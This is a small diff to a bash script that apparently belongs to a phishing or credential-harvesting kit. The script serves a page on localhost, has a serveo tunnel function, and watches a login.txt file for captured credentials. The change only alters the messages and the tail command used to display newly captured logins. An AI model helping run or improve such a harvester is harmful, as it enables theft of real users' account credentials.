@@ -25,7 +25,8 @@ start_localhost() {
     echo -e "${GRN}[+] Starting localhost server at http://127.0.0.1:8080 ...${NC}"
     php -S 127.0.0.1:8080 > /dev/null 2>&1 &
     echo -e "${GRN}[!] Waiting for credentials... (Press CTRL + C to exit)${NC}"
-tail -f login.txt
+echo -e "${YEL}[!] Waiting for new credentials... (Press CTRL + C to exit)${NC}"
+tail -n 0 -f login.txt 2>/dev/null
 }
 
 start_serveo() {
